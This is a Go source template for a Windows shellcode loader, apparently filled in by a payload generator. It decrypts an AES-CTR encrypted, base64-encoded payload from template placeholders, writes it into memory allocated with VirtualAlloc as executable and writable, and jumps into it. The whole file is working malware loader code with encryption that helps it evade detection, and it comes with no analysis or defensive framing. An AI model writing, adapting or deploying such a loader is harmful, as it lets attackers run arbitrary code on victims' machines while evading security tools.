package main

import (
	"crypto/aes"
	"crypto/cipher"
	"encoding/base64"
	"strings"
	"syscall"
	"unsafe"
)

const (
	PROCESS_ALL_ACCESS     = syscall.STANDARD_RIGHTS_REQUIRED | syscall.SYNCHRONIZE | 0xfff
	MEM_COMMIT             = 0x001000
	MEM_RESERVE            = 0x002000
	PAGE_EXECUTE_READWRITE = 0x40
)

var (
	kernel32         = syscall.NewLazyDLL("kernel32.dll")
	procVirtualAlloc = kernel32.NewProc("VirtualAlloc")
)

func main() {
	// Decode ciphertext into shellcode
	ciphertext, _ := base64.StdEncoding.DecodeString("{{.Ciphertext}}")
	key, _ := base64.StdEncoding.DecodeString("{{.Key}}")
	block, _ := aes.NewCipher(key)
	plaintext := make([]byte, len(ciphertext))
	stream := cipher.NewCTR(block, key[aes.BlockSize:])
	stream.XORKeyStream(plaintext, ciphertext)

	// Allocate memory as PAGE_EXECUTE_READWRITE
	addr, _, err := procVirtualAlloc.Call(0, uintptr(len(plaintext)), MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE)
	if err != nil && !strings.Contains(err.Error(), "operation completed successfully") {
		panic(err)
	}

	// Write the shellcode into the allocated memory
	buf := (*[890000]byte)(unsafe.Pointer(addr))
	for x, value := range plaintext {
		buf[x] = value
	}

	syscall.Syscall(addr, 0, 0, 0, 0)
}
